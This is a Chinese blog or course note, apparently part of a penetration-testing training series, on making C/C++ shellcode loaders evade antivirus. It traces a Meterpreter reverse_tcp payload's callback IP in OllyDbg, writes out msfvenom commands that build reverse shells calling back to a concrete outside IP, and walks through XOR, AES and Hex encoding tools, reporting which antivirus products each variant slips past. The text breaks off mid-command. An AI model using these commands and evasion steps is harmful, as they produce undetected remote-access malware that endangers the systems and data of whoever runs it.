title="涉及技术："></a>涉及技术：</h4><p>ShellCode混淆加密，无文件落地，分离拆分，白名单，DLL加载，Syscall，加壳加花，</p><p>资源修改，特征修改，二次开发CS，内存休眠，进程注入，反沙盒，反调试，CDN解析等</p><blockquote><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><h4 id="➢-C-x2F-C-ShellCode分析-OD-amp-IDA-amp-朔源"><a href="#➢-C-x2F-C-ShellCode分析-OD-amp-IDA-amp-朔源" class="headerlink" title="➢ C&#x2F;C++-ShellCode分析-OD&amp;IDA&amp;朔源"></a>➢ C&#x2F;C++-ShellCode分析-OD&amp;IDA&amp;朔源</h4><h4 id="➢-C-x2F-C-ShellCode变异-编码混淆加密算法"><a href="#➢-C-x2F-C-ShellCode变异-编码混淆加密算法" class="headerlink" title="➢ C&#x2F;C++-ShellCode变异-编码混淆加密算法"></a>➢ C&#x2F;C++-ShellCode变异-编码混淆加密算法</h4><h4 id="➢-C-x2F-C-回调执行代码-汇编-amp-句柄-amp-API-amp-UI等"><a href="#➢-C-x2F-C-回调执行代码-汇编-amp-句柄-amp-API-amp-UI等" class="headerlink" title="➢ C&#x2F;C++-回调执行代码-汇编&amp;句柄&amp;API&amp;UI等"></a>➢ C&#x2F;C++-回调执行代码-汇编&amp;句柄&amp;API&amp;UI等</h4></blockquote><h3 id="C-x2F-C-ShellCode分析-OD-amp-IDA-amp-朔源"><a href="#C-x2F-C-ShellCode分析-OD-amp-IDA-amp-朔源" class="headerlink" title="#C&#x2F;C++-ShellCode分析-OD&amp;IDA&amp;朔源"></a>#C&#x2F;C++-ShellCode分析-OD&amp;IDA&amp;朔源</h3><h5 id="1、EXE朔源-IP及端口-杀毒分析"><a href="#1、EXE朔源-IP及端口-杀毒分析" class="headerlink" title="1、EXE朔源-IP及端口-杀毒分析"></a>1、EXE朔源-IP及端口-杀毒分析</h5><h5 id="2、编译修改-IP及端口-威胁感知"><a href="#2、编译修改-IP及端口-威胁感知" class="headerlink" title="2、编译修改-IP及端口-威胁感知"></a>2、编译修改-IP及端口-威胁感知</h5><h5 id="reverse-tcp-asm"><a href="#reverse-tcp-asm" class="headerlink" title="reverse_tcp.asm"></a>reverse_tcp.asm</h5><p><a href="https://www.cnblogs.com/Akkuman/p/12859091.html">metasploit payload运行原理浅析(sockedi调用约定是什么) - Akkuman - 博客园 (cnblogs.com)</a></p><p><a href="https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/payload/windows/reverse_tcp.rb">https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/payload/windows/reverse_tcp.rb</a></p><p><img src="/../images/Day107-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-C-C-%E6%BA%AF%E6%BA%90ShellCode%E4%B8%8A%E7%BA%BF-%E6%B7%B7%E6%B7%86%E5%8F%98%E5%BC%82%E7%AE%97%E6%B3%95-%E5%9B%9E%E8%B0%83%E7%BC%96%E8%AF%91%E6%89%A7%E8%A1%8C/image-20230427105300454.png" alt="image-20230427105300454"></p><h5 id="可执行文件因为已经生成了exe，所有很难再修改内在，而且修改可能会造成无法上线，shellcode则可以在其生成之前我们自己对其代码进行修改调试后生成exe免杀"><a href="#可执行文件因为已经生成了exe，所有很难再修改内在，而且修改可能会造成无法上线，shellcode则可以在其生成之前我们自己对其代码进行修改调试后生成exe免杀" class="headerlink" title="可执行文件因为已经生成了exe，所有很难再修改内在，而且修改可能会造成无法上线，shellcode则可以在其生成之前我们自己对其代码进行修改调试后生成exe免杀"></a>可执行文件因为已经生成了exe，所有很难再修改内在，而且修改可能会造成无法上线，shellcode则可以在其生成之前我们自己对其代码进行修改调试后生成exe免杀</h5><p><img src="/../images/Day107-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-C-C-%E6%BA%AF%E6%BA%90ShellCode%E4%B8%8A%E7%BA%BF-%E6%B7%B7%E6%B7%86%E5%8F%98%E5%BC%82%E7%AE%97%E6%B3%95-%E5%9B%9E%E8%B0%83%E7%BC%96%E8%AF%91%E6%89%A7%E8%A1%8C/image-20230427105606074.png" alt="image-20230427105606074"></p><h5 id="木马源代码：shellcode-解析器"><a href="#木马源代码：shellcode-解析器" class="headerlink" title="木马源代码：shellcode+解析器"></a>木马源代码：shellcode+解析器</h5><h6 id="shellcode-buf"><a href="#shellcode-buf" class="headerlink" title="shellcode  buf"></a>shellcode  buf</h6><p><img src="/../images/Day107-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-C-C-%E6%BA%AF%E6%BA%90ShellCode%E4%B8%8A%E7%BA%BF-%E6%B7%B7%E6%B7%86%E5%8F%98%E5%BC%82%E7%AE%97%E6%B3%95-%E5%9B%9E%E8%B0%83%E7%BC%96%E8%AF%91%E6%89%A7%E8%A1%8C/image-20230427115037989.png" alt="image-20230427115037989"></p><h6 id="解析器"><a href="#解析器" class="headerlink" title="解析器"></a>解析器</h6><p><img src="/../images/Day107-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-C-C-%E6%BA%AF%E6%BA%90ShellCode%E4%B8%8A%E7%BA%BF-%E6%B7%B7%E6%B7%86%E5%8F%98%E5%BC%82%E7%AE%97%E6%B3%95-%E5%9B%9E%E8%B0%83%E7%BC%96%E8%AF%91%E6%89%A7%E8%A1%8C/image-20230427115135476.png" alt="image-20230427115135476"></p><h6 id="用cs或者msf生成的payload-c未打包成exe的文件，用VS打开，可以手动编译，选择Release，不选择Debug调试，会出问题"><a href="#用cs或者msf生成的payload-c未打包成exe的文件，用VS打开，可以手动编译，选择Release，不选择Debug调试，会出问题" class="headerlink" title="用cs或者msf生成的payload.c未打包成exe的文件，用VS打开，可以手动编译，选择Release，不选择Debug调试，会出问题"></a>用cs或者msf生成的payload.c未打包成exe的文件，用VS打开，可以手动编译，选择Release，不选择Debug调试，会出问题</h6><p><img src="/../images/Day107-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-C-C-%E6%BA%AF%E6%BA%90ShellCode%E4%B8%8A%E7%BA%BF-%E6%B7%B7%E6%B7%86%E5%8F%98%E5%BC%82%E7%AE%97%E6%B3%95-%E5%9B%9E%E8%B0%83%E7%BC%96%E8%AF%91%E6%89%A7%E8%A1%8C/image-20230427104424543.png" alt="image-20230427104424543"></p><h4 id="下面分析杀毒软件的原理：（反编译逆向分析）"><a href="#下面分析杀毒软件的原理：（反编译逆向分析）" class="headerlink" title="下面分析杀毒软件的原理：（反编译逆向分析）"></a>下面分析杀毒软件的原理：（反编译逆向分析）</h4><h6 id="msf的模块都对应着shellcode"><a href="#msf的模块都对应着shellcode" class="headerlink" title="msf的模块都对应着shellcode"></a>msf的模块都对应着shellcode</h6><h6 id="链接里msf的shellcode的代码原理"><a href="#链接里msf的shellcode的代码原理" class="headerlink" title="链接里msf的shellcode的代码原理"></a>链接里msf的shellcode的代码原理</h6><p><a href="https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/payload/windows/reverse_tcp.rb">https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/payload/windows/reverse_tcp.rb</a></p><p><img src="/../images/Day107-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-C-C-%E6%BA%AF%E6%BA%90ShellCode%E4%B8%8A%E7%BA%BF-%E6%B7%B7%E6%B7%86%E5%8F%98%E5%BC%82%E7%AE%97%E6%B3%95-%E5%9B%9E%E8%B0%83%E7%BC%96%E8%AF%91%E6%89%A7%E8%A1%8C/image-20230427110450838.png" alt="image-20230427110450838"></p><h6 id="shellcode先执行call-eax再进入buf核心语句"><a href="#shellcode先执行call-eax再进入buf核心语句" class="headerlink" title="shellcode先执行call eax再进入buf核心语句"></a>shellcode先执行call eax再进入buf核心语句</h6><p><img src="/../images/Day107-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-C-C-%E6%BA%AF%E6%BA%90ShellCode%E4%B8%8A%E7%BA%BF-%E6%B7%B7%E6%B7%86%E5%8F%98%E5%BC%82%E7%AE%97%E6%B3%95-%E5%9B%9E%E8%B0%83%E7%BC%96%E8%AF%91%E6%89%A7%E8%A1%8C/image-20230427111421064.png" alt="image-20230427111421064"></p><h6 id="用OllyDbg反编译exe"><a href="#用OllyDbg反编译exe" class="headerlink" title="用OllyDbg反编译exe"></a>用OllyDbg反编译exe</h6><p><img src="/../images/Day107-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-C-C-%E6%BA%AF%E6%BA%90ShellCode%E4%B8%8A%E7%BA%BF-%E6%B7%B7%E6%B7%86%E5%8F%98%E5%BC%82%E7%AE%97%E6%B3%95-%E5%9B%9E%E8%B0%83%E7%BC%96%E8%AF%91%E6%89%A7%E8%A1%8C/image-20230427111538014.png" alt="image-20230427111538014"></p><h6 id="尝试搜索上面github的代码call-ebp"><a href="#尝试搜索上面github的代码call-ebp" class="headerlink" title="尝试搜索上面github的代码call ebp"></a>尝试搜索上面github的代码call ebp</h6><p><img src="/../images/Day107-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-C-C-%E6%BA%AF%E6%BA%90ShellCode%E4%B8%8A%E7%BA%BF-%E6%B7%B7%E6%B7%86%E5%8F%98%E5%BC%82%E7%AE%97%E6%B3%95-%E5%9B%9E%E8%B0%83%E7%BC%96%E8%AF%91%E6%89%A7%E8%A1%8C/image-20230427112200943.png" alt="image-20230427112200943"></p><h6 id="再OllyDbg里面搜索"><a href="#再OllyDbg里面搜索" class="headerlink" title="再OllyDbg里面搜索"></a>再OllyDbg里面搜索</h6><p><img src="/../images/Day107-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-C-C-%E6%BA%AF%E6%BA%90ShellCode%E4%B8%8A%E7%BA%BF-%E6%B7%B7%E6%B7%86%E5%8F%98%E5%BC%82%E7%AE%97%E6%B3%95-%E5%9B%9E%E8%B0%83%E7%BC%96%E8%AF%91%E6%89%A7%E8%A1%8C/image-20230427112339612.png" alt="image-20230427112339612"></p><h6 id="显示未找到，这是因为要到CALL-EAX先执行才步入核心代码"><a href="#显示未找到，这是因为要到CALL-EAX先执行才步入核心代码" class="headerlink" title="显示未找到，这是因为要到CALL EAX先执行才步入核心代码"></a>显示未找到，这是因为要到CALL EAX先执行才步入核心代码</h6><p><img src="/../images/Day107-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-C-C-%E6%BA%AF%E6%BA%90ShellCode%E4%B8%8A%E7%BA%BF-%E6%B7%B7%E6%B7%86%E5%8F%98%E5%BC%82%E7%AE%97%E6%B3%95-%E5%9B%9E%E8%B0%83%E7%BC%96%E8%AF%91%E6%89%A7%E8%A1%8C/image-20230427112417280.png" alt="image-20230427112417280"></p><h6 id="找到上此处的CALL-EAX点击调试自动步入，进入核心代码"><a href="#找到上此处的CALL-EAX点击调试自动步入，进入核心代码" class="headerlink" title="找到上此处的CALL EAX点击调试自动步入，进入核心代码"></a>找到上此处的CALL EAX点击调试自动步入，进入核心代码</h6><p><img src="/../images/Day107-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-C-C-%E6%BA%AF%E6%BA%90ShellCode%E4%B8%8A%E7%BA%BF-%E6%B7%B7%E6%B7%86%E5%8F%98%E5%BC%82%E7%AE%97%E6%B3%95-%E5%9B%9E%E8%B0%83%E7%BC%96%E8%AF%91%E6%89%A7%E8%A1%8C/image-20230427111958790.png" alt="image-20230427111958790"></p><h6 id="再次搜索就能搜到了"><a href="#再次搜索就能搜到了" class="headerlink" title="再次搜索就能搜到了"></a>再次搜索就能搜到了</h6><p><img src="/../images/Day107-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-C-C-%E6%BA%AF%E6%BA%90ShellCode%E4%B8%8A%E7%BA%BF-%E6%B7%B7%E6%B7%86%E5%8F%98%E5%BC%82%E7%AE%97%E6%B3%95-%E5%9B%9E%E8%B0%83%E7%BC%96%E8%AF%91%E6%89%A7%E8%A1%8C/image-20230427112545211.png" alt="image-20230427112545211"></p><h6 id="在github中再次找到代码的对应处"><a href="#在github中再次找到代码的对应处" class="headerlink" title="在github中再次找到代码的对应处"></a>在github中再次找到代码的对应处</h6><p><img src="/../images/Day107-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-C-C-%E6%BA%AF%E6%BA%90ShellCode%E4%B8%8A%E7%BA%BF-%E6%B7%B7%E6%B7%86%E5%8F%98%E5%BC%82%E7%AE%97%E6%B3%95-%E5%9B%9E%E8%B0%83%E7%BC%96%E8%AF%91%E6%89%A7%E8%A1%8C/image-20230427112709794.png" alt="image-20230427112709794"></p><h6 id="ip和端口对应着上面反编译后的两个PUSH前的16进制数"><a href="#ip和端口对应着上面反编译后的两个PUSH前的16进制数" class="headerlink" title="ip和端口对应着上面反编译后的两个PUSH前的16进制数"></a>ip和端口对应着上面反编译后的两个PUSH前的16进制数</h6><p><img src="/../images/Day107-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-C-C-%E6%BA%AF%E6%BA%90ShellCode%E4%B8%8A%E7%BA%BF-%E6%B7%B7%E6%B7%86%E5%8F%98%E5%BC%82%E7%AE%97%E6%B3%95-%E5%9B%9E%E8%B0%83%E7%BC%96%E8%AF%91%E6%89%A7%E8%A1%8C/image-20230427113332782.png" alt="image-20230427113332782"></p><h6 id="将其解码出来，可以发现就是ip和端口"><a href="#将其解码出来，可以发现就是ip和端口" class="headerlink" title="将其解码出来，可以发现就是ip和端口"></a>将其解码出来，可以发现就是ip和端口</h6><p><img src="/../images/Day107-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-C-C-%E6%BA%AF%E6%BA%90ShellCode%E4%B8%8A%E7%BA%BF-%E6%B7%B7%E6%B7%86%E5%8F%98%E5%BC%82%E7%AE%97%E6%B3%95-%E5%9B%9E%E8%B0%83%E7%BC%96%E8%AF%91%E6%89%A7%E8%A1%8C/image-20230427113408528.png" alt="image-20230427113408528"></p><p><img src="/../images/Day107-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-C-C-%E6%BA%AF%E6%BA%90ShellCode%E4%B8%8A%E7%BA%BF-%E6%B7%B7%E6%B7%86%E5%8F%98%E5%BC%82%E7%AE%97%E6%B3%95-%E5%9B%9E%E8%B0%83%E7%BC%96%E8%AF%91%E6%89%A7%E8%A1%8C/image-20230427113505805.png" alt="image-20230427113505805"></p><h6 id="在shellcode的buf代码里面"><a href="#在shellcode的buf代码里面" class="headerlink" title="在shellcode的buf代码里面"></a>在shellcode的buf代码里面</h6><p><img src="/../images/Day107-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-C-C-%E6%BA%AF%E6%BA%90ShellCode%E4%B8%8A%E7%BA%BF-%E6%B7%B7%E6%B7%86%E5%8F%98%E5%BC%82%E7%AE%97%E6%B3%95-%E5%9B%9E%E8%B0%83%E7%BC%96%E8%AF%91%E6%89%A7%E8%A1%8C/image-20230427114213433.png" alt="image-20230427114213433"></p><h6 id="这些都是一开始生成模块时设置的参数，这也就是杀毒软件的原理，跟OllyDbg一样，将其反编译"><a href="#这些都是一开始生成模块时设置的参数，这也就是杀毒软件的原理，跟OllyDbg一样，将其反编译" class="headerlink" title="这些都是一开始生成模块时设置的参数，这也就是杀毒软件的原理，跟OllyDbg一样，将其反编译"></a>这些都是一开始生成模块时设置的参数，这也就是杀毒软件的原理，跟OllyDbg一样，将其反编译</h6><p><img src="/../images/Day107-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-C-C-%E6%BA%AF%E6%BA%90ShellCode%E4%B8%8A%E7%BA%BF-%E6%B7%B7%E6%B7%86%E5%8F%98%E5%BC%82%E7%AE%97%E6%B3%95-%E5%9B%9E%E8%B0%83%E7%BC%96%E8%AF%91%E6%89%A7%E8%A1%8C/image-20230427113551511.png" alt="image-20230427113551511"></p><h3 id="C-x2F-C-ShellCode变异-编码混淆加密算法"><a href="#C-x2F-C-ShellCode变异-编码混淆加密算法" class="headerlink" title="#C&#x2F;C++-ShellCode变异-编码混淆加密算法"></a>#C&#x2F;C++-ShellCode变异-编码混淆加密算法</h3><h6 id="加密shellcode（buf）方法：Xor-Aes-Hex-Rc4-Rsa等"><a href="#加密shellcode（buf）方法：Xor-Aes-Hex-Rc4-Rsa等" class="headerlink" title="加密shellcode（buf）方法：Xor Aes Hex Rc4 Rsa等"></a>加密shellcode（buf）方法：Xor Aes Hex Rc4 Rsa等</h6><p><a href="https://github.com/Arno0x/ShellcodeWrapper">https://github.com/Arno0x/ShellcodeWrapper</a></p><h5 id="msfvenom-p-windows-x2F-meterpreter-x2F-reverse-tcp-e-x86-x2F-shikata-ga-nai-i-6-b-‘-x00’-lhost-x3D-47-94-236-117-lport-x3D-3333-f-raw-gt-shellcode-raw"><a href="#msfvenom-p-windows-x2F-meterpreter-x2F-reverse-tcp-e-x86-x2F-shikata-ga-nai-i-6-b-‘-x00’-lhost-x3D-47-94-236-117-lport-x3D-3333-f-raw-gt-shellcode-raw" class="headerlink" title="msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp -e x86&#x2F;shikata_ga_nai -i 6 -b ‘\x00’ lhost&#x3D;47.94.236.117 lport&#x3D;3333 -f raw &gt; shellcode.raw"></a>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp -e x86&#x2F;shikata_ga_nai -i 6 -b ‘\x00’ lhost&#x3D;47.94.236.117 lport&#x3D;3333 -f raw &gt; shellcode.raw</h5><h5 id="网上写好的加密脚本：shellcode-encoder-py"><a href="#网上写好的加密脚本：shellcode-encoder-py" class="headerlink" title="网上写好的加密脚本：shellcode_encoder.py"></a>网上写好的加密脚本：shellcode_encoder.py</h5><h5 id="1、XOR加密：python2-shellcode-encoder-py-cpp-cs-py-payload-bin-xiaodi-xor"><a href="#1、XOR加密：python2-shellcode-encoder-py-cpp-cs-py-payload-bin-xiaodi-xor" class="headerlink" title="1、XOR加密：python2 shellcode_encoder.py -cpp -cs -py payload.bin xiaodi xor"></a>1、XOR加密：python2 shellcode_encoder.py -cpp -cs -py payload.bin xiaodi xor</h5><h5 id="CS-amp-MSF"><a href="#CS-amp-MSF" class="headerlink" title="CS&amp;MSF"></a>CS&amp;MSF</h5><h5 id="msfvenom-p-windows-x2F-meterpreter-x2F-reverse-tcp-e-x86-x2F-shikata-ga-nai-i-6-b-‘-x00’-lhost-x3D-47-94-236-117-lport-x3D-3333-f-raw-gt-shellcode-raw-1"><a href="#msfvenom-p-windows-x2F-meterpreter-x2F-reverse-tcp-e-x86-x2F-shikata-ga-nai-i-6-b-‘-x00’-lhost-x3D-47-94-236-117-lport-x3D-3333-f-raw-gt-shellcode-raw-1" class="headerlink" title="msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp -e x86&#x2F;shikata_ga_nai -i 6 -b ‘\x00’ lhost&#x3D;47.94.236.117 lport&#x3D;3333 -f raw &gt; shellcode.raw"></a>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp -e x86&#x2F;shikata_ga_nai -i 6 -b ‘\x00’ lhost&#x3D;47.94.236.117 lport&#x3D;3333 -f raw &gt; shellcode.raw</h5><h6 id="用CS或者MSF都可以生成一个Raw文件"><a href="#用CS或者MSF都可以生成一个Raw文件" class="headerlink" title="用CS或者MSF都可以生成一个Raw文件"></a>用CS或者MSF都可以生成一个Raw文件</h6><p><img src="/../images/Day107-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-C-C-%E6%BA%AF%E6%BA%90ShellCode%E4%B8%8A%E7%BA%BF-%E6%B7%B7%E6%B7%86%E5%8F%98%E5%BC%82%E7%AE%97%E6%B3%95-%E5%9B%9E%E8%B0%83%E7%BC%96%E8%AF%91%E6%89%A7%E8%A1%8C/image-20230427142925481.png" alt="image-20230427142925481"></p><h6 id="生成为payload-bin"><a href="#生成为payload-bin" class="headerlink" title="生成为payload.bin"></a>生成为payload.bin</h6><p><img src="/../images/Day107-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-C-C-%E6%BA%AF%E6%BA%90ShellCode%E4%B8%8A%E7%BA%BF-%E6%B7%B7%E6%B7%86%E5%8F%98%E5%BC%82%E7%AE%97%E6%B3%95-%E5%9B%9E%E8%B0%83%E7%BC%96%E8%AF%91%E6%89%A7%E8%A1%8C/image-20230427143056002.png" alt="image-20230427143056002"></p><h6 id="执行后加密生成了三种后缀的代码"><a href="#执行后加密生成了三种后缀的代码" class="headerlink" title="执行后加密生成了三种后缀的代码"></a>执行后加密生成了三种后缀的代码</h6><p><img src="/../images/Day107-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-C-C-%E6%BA%AF%E6%BA%90ShellCode%E4%B8%8A%E7%BA%BF-%E6%B7%B7%E6%B7%86%E5%8F%98%E5%BC%82%E7%AE%97%E6%B3%95-%E5%9B%9E%E8%B0%83%E7%BC%96%E8%AF%91%E6%89%A7%E8%A1%8C/image-20230427143511612.png" alt="image-20230427143511612"></p><h6 id="打开其中的cpp代码"><a href="#打开其中的cpp代码" class="headerlink" title="打开其中的cpp代码"></a>打开其中的cpp代码</h6><p><img src="/../images/Day107-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-C-C-%E6%BA%AF%E6%BA%90ShellCode%E4%B8%8A%E7%BA%BF-%E6%B7%B7%E6%B7%86%E5%8F%98%E5%BC%82%E7%AE%97%E6%B3%95-%E5%9B%9E%E8%B0%83%E7%BC%96%E8%AF%91%E6%89%A7%E8%A1%8C/image-20230427143839117.png" alt="image-20230427143839117"></p><h6 id="进行编译打包成exe后，还是被杀毒软件杀了"><a href="#进行编译打包成exe后，还是被杀毒软件杀了" class="headerlink" title="进行编译打包成exe后，还是被杀毒软件杀了"></a>进行编译打包成exe后，还是被杀毒软件杀了</h6><p><img src="/../images/Day107-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-C-C-%E6%BA%AF%E6%BA%90ShellCode%E4%B8%8A%E7%BA%BF-%E6%B7%B7%E6%B7%86%E5%8F%98%E5%BC%82%E7%AE%97%E6%B3%95-%E5%9B%9E%E8%B0%83%E7%BC%96%E8%AF%91%E6%89%A7%E8%A1%8C/image-20230427144045998.png" alt="image-20230427144045998"></p><h5 id="自己写的加密脚本：xor-py"><a href="#自己写的加密脚本：xor-py" class="headerlink" title="自己写的加密脚本：xor.py"></a>自己写的加密脚本：xor.py</h5><h6 id="加密shellcode："><a href="#加密shellcode：" class="headerlink" title="加密shellcode："></a>加密shellcode：</h6><h6 id="python-xor-py-s-shellcode-bin-d-payload-c-n-10-r-out-bin（生成payload-c）"><a href="#python-xor-py-s-shellcode-bin-d-payload-c-n-10-r-out-bin（生成payload-c）" class="headerlink" title="python xor.py -s shellcode.bin  -d payload.c -n 10 -r out.bin（生成payload.c）"></a>python xor.py -s shellcode.bin  -d payload.c -n 10 -r out.bin（生成payload.c）</h6><p><img src="/../images/Day107-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-C-C-%E6%BA%AF%E6%BA%90ShellCode%E4%B8%8A%E7%BA%BF-%E6%B7%B7%E6%B7%86%E5%8F%98%E5%BC%82%E7%AE%97%E6%B3%95-%E5%9B%9E%E8%B0%83%E7%BC%96%E8%AF%91%E6%89%A7%E8%A1%8C/image-20230427144317457.png" alt="image-20230427144317457"></p><h6 id="payload-c"><a href="#payload-c" class="headerlink" title="payload.c"></a>payload.c</h6><p><img src="/../images/Day107-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-C-C-%E6%BA%AF%E6%BA%90ShellCode%E4%B8%8A%E7%BA%BF-%E6%B7%B7%E6%B7%86%E5%8F%98%E5%BC%82%E7%AE%97%E6%B3%95-%E5%9B%9E%E8%B0%83%E7%BC%96%E8%AF%91%E6%89%A7%E8%A1%8C/image-20230427144410786.png" alt="image-20230427144410786"></p><h6 id="编译生成exe，一开始生成了32位的被杀了，后面选择生成64位的一开始没有查杀（后面被杀了），可能32位的容易被查杀一些"><a href="#编译生成exe，一开始生成了32位的被杀了，后面选择生成64位的一开始没有查杀（后面被杀了），可能32位的容易被查杀一些" class="headerlink" title="编译生成exe，一开始生成了32位的被杀了，后面选择生成64位的一开始没有查杀（后面被杀了），可能32位的容易被查杀一些"></a>编译生成exe，一开始生成了32位的被杀了，后面选择生成64位的一开始没有查杀（后面被杀了），可能32位的容易被查杀一些</h6><h6 id="某绒没有查杀"><a href="#某绒没有查杀" class="headerlink" title="某绒没有查杀"></a>某绒没有查杀</h6><h6 id="x60后面查杀了"><a href="#x60后面查杀了" class="headerlink" title="x60后面查杀了"></a>x60后面查杀了</h6><p><img src="/../images/Day107-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-C-C-%E6%BA%AF%E6%BA%90ShellCode%E4%B8%8A%E7%BA%BF-%E6%B7%B7%E6%B7%86%E5%8F%98%E5%BC%82%E7%AE%97%E6%B3%95-%E5%9B%9E%E8%B0%83%E7%BC%96%E8%AF%91%E6%89%A7%E8%A1%8C/image-20230427145340847.png" alt="image-20230427145340847"></p><h5 id="2、AES加密：python2-shellcode-encoder-py-cpp-cs-py-shellcode-raw-xiaodi-aes（还是网上的脚本shellcode-encoder-py）"><a href="#2、AES加密：python2-shellcode-encoder-py-cpp-cs-py-shellcode-raw-xiaodi-aes（还是网上的脚本shellcode-encoder-py）" class="headerlink" title="2、AES加密：python2 shellcode_encoder.py -cpp -cs -py shellcode.raw xiaodi aes（还是网上的脚本shellcode_encoder.py）"></a>2、AES加密：python2 shellcode_encoder.py -cpp -cs -py shellcode.raw xiaodi aes（还是网上的脚本shellcode_encoder.py）</h5><h6 id="只过了某绒"><a href="#只过了某绒" class="headerlink" title="只过了某绒"></a>只过了某绒</h6><p><img src="/../images/Day107-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-C-C-%E6%BA%AF%E6%BA%90ShellCode%E4%B8%8A%E7%BA%BF-%E6%B7%B7%E6%B7%86%E5%8F%98%E5%BC%82%E7%AE%97%E6%B3%95-%E5%9B%9E%E8%B0%83%E7%BC%96%E8%AF%91%E6%89%A7%E8%A1%8C/image-20230427151132433.png" alt="image-20230427151132433"></p><h5 id="3、Hex加密"><a href="#3、Hex加密" class="headerlink" title="3、Hex加密"></a>3、Hex加密</h5><h5 id="msfvenom-p-windows-x2F-meterpreter-x2F-reverse-tcp-lhost-x3D-47-94-236-117-lport-x3D-6688-f-c"><a href="#msfvenom-p-windows-x2F-meterpreter-x2F-reverse-tcp-lhost-x3D-47-94-236-117-lport-x3D-6688-f-c" class="headerlink" title="msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;47.94.236.117 lport&#x3D;6688 -f c"></a>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;47.94.236.117 lport&#x3D;6688 -f c</h5><p><a href="https://gchq.github.io/CyberChef/">https://gchq.github.io/CyberChef/</a></p><p>项目地址：<a href="https://github.com/ByPassAVTeam/ShellcodeLoader">https://github.com/ByPassAVTeam/ShellcodeLoader</a></p><h5 id="LoaderMaker-exe-download-dat-hex数据-xiaodi-exe-生成文件名"><a href="#LoaderMaker-exe-download-dat-hex数据-xiaodi-exe-生成文件名" class="headerlink" title="LoaderMaker.exe download.dat(hex数据) xiaodi.exe(生成文件名)"></a>LoaderMaker.exe download.dat(hex数据) xiaodi.exe(生成文件名)</h5><h6 id="msf生成"><a href="#msf生成" class="headerlink" title="msf生成"></a>msf生成</h6><p><img src="/../images/Day107-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-C-C-%E6%BA%AF%E6%BA%90ShellCode%E4%B8%8A%E7%BA%BF-%E6%B7%B7%E6%B7%86%E5%8F%98%E5%BC%82%E7%AE%97%E6%B3%95-%E5%9B%9E%E8%B0%83%E7%BC%96%E8%AF%91%E6%89%A7%E8%A1%8C/image-20230427151523596.png" alt="image-20230427151523596"></p><h6 id="将代码去掉-x2F-和空格，到处为dat文件"><a href="#将代码去掉-x2F-和空格，到处为dat文件" class="headerlink" title="将代码去掉&#x2F;和空格，到处为dat文件"></a>将代码去掉&#x2F;和空格，到处为dat文件</h6><p><img src="/../images/Day107-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-C-C-%E6%BA%AF%E6%BA%90ShellCode%E4%B8%8A%E7%BA%BF-%E6%B7%B7%E6%B7%86%E5%8F%98%E5%BC%82%E7%AE%97%E6%B3%95-%E5%9B%9E%E8%B0%83%E7%BC%96%E8%AF%91%E6%89%A7%E8%A1%8C/image-20230427151854119.png" alt="image-20230427151854119"></p><h6 id="在其项目内执行-LoaderMaker-exe-download-dat-hex数据-xxddd-exe-生成文件名"><a href="#在其项目内执行-LoaderMaker-exe-download-dat-hex数据-xxddd-exe-生成文件名" class="headerlink" title="在其项目内执行:LoaderMaker.exe   download.dat(hex数据)    xxddd.exe(生成文件名)"></a>在其项目内执行:LoaderMaker.exe   download.dat(hex数据)    xxddd.exe(生成文件名)</h6><h6 id="可过某绒"><a href="#可过某绒" class="headerlink" title="可过某绒"></a>可过某绒</h6><p><img src="/../images/Day107-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-C-C-%E6%BA%AF%E6%BA%90ShellCode%E4%B8%8A%E7%BA%BF-%E6%B7%B7%E6%B7%86%E5%8F%98%E5%BC%82%E7%AE%97%E6%B3%95-%E5%9B%9E%E8%B0%83%E7%BC%96%E8%AF%91%E6%89%A7%E8%A1%8C/image-20230427151946589.png" alt="image-20230427151946589"></p><h5 id="4、Rc4加密（比其他更加复杂，加密强度大）"><a href="#4、Rc4加密（比其他更加复杂，加密强度大）" class="headerlink" title="4、Rc4加密（比其他更加复杂，加密强度大）"></a>4、Rc4加密（比其他更加复杂，加密强度大）</h5><p>msfvenom -p 